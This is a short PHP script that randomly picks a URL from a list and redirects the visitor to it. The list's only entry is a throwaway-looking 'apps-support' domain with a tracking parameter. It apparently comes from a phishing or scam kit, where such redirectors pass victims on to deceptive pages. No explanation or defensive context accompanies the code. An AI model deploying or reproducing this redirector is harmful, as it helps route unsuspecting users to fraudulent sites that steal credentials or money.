<?php

$ls = array(
"https://apps-supportmanscdnxs11147.com/?jiwa"
                  );
$ac = count($ls) - 1;
$rd = rand (0,$ac);
$rda = $ls[$rd];
header("location:".$rda);

?>